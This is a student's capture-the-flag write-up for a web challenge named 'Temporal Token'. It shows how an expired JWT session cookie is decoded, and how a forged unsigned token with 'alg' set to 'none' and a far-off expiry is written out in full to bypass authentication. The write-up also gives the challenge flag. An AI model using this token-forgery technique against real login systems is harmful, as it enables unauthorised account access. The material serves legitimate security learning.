# 2. Temporal Token

> I made my own website with custom auth, but why can't i login with my credentials? ``` Username: Belegar Password: Ironhammer ``` Directly access the challenge server at https://temporal-token.nitephase.live

## Solution:
I tried given password and username which gave thisz output
```
{
  "status": 200,
  "body": {
    "success": true
  },
  "afterCheck": {
    "status": 401,
    "body": {
      "error": "Token expired"
    }
  }
}
```
In cookies i got `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJCZWxlZ2FyIiwiZXhwIjowfQ.L4UuI63oMzkmh4clZMZPoANwNxnjiYTtZO90IBhQ8B8`
Decoded it using base 64  `{"alg":"HS256","typ":"JWT"}{"sub":"Belegar","exp":0}R:ރ3hxrVLd�7q8NNB`
I identified the value as a JWT.Then decoded it via an online parser jwt.io and modified the exp claim using a new epoch timestamp 1 year. Then I injected the modified token back into the cookie store but its validation failed due to HS256 signature requirements. On further research i realised that we can change alg to none and if website has bad security it will just take the token as valid 
I then put the final `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJCZWxlZ2FyIiwiZXhwIjoxNzk2MDQ3ODkxfQ.` token

## Flag:

```
nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?}
```

## Concepts learnt:

I learned how JWTs work and how their parts can be changed. By looking into this, I also found out what problems can happen on websites that don’t secure them properly.

## Notes:

I spent lot of some time on cracking a valid signature to change expiry time and exploit it
